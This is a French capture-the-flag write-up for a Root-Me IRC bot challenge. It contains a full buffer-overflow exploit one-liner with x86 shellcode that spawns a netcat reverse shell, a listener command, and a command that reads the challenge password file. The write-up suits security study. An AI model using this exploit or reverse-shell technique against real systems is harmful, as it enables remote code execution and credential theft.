( (  sleep 2 ; echo NICK dodo4422;  echo USER dodo4422 dodo4422 dodo4422 :dodo4422;  sleep 1;  echo "JOIN #root-me_challenge";  sleep 1;  echo "PRIVMSG Pown3dBot" :`python -c 'print "!" + "A"*139 + "\x99\xf7\xff\xbf" + "PRIVMSG\x00"'`; echo "PRIVMSG Pown3dBot" :`python -c 'print "!" + "A"*103 + "PRIVMSG\x00"'` ; echo -e "PRIVMSG Pown3dBot" + `python -c "import sys;sys.stdout.write('\x90'*60 + '\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x38')"` ) | nc irc.root-me.org 6667 ) & nc -lvp 9998
cat /challenge/app-systeme/ch31/.passwd

Nous pouvons exploiter un buffer overflow en envoyant des PRIVMSG, car si l'on envoie un ! en premier caractere du corps du message, ce dernier sera interprete comme une commande, de taille maximale MAX_CMD_LEN (32), alors que nous pouvons envoyer jusqu'a 512 octets. Nous pouvons ainsi en profiter pour ecraser les structures Handler qui se trouvent dans Handler_List, et executer du code arbitraire lors d'evenements (comme PRIVMSG par exemple).
On ecrase donc la deuxieme structure de la liste, en mettant un pointeur vers le dernier message que nous envoyons (l'ecrasement se fait en deux temps), nous permettant de faire executer au client cible notre code. On lui fait executer un reverse bind shell (reverse.s, ce qui nous permettra d'avoir un shell chez le client cible).
Le client execute donc notre code et se connecte a 127.0.0.1:9998 pour y attendre des commandes a executer, il ne nous reste plus qu'a chercher le mot de passe.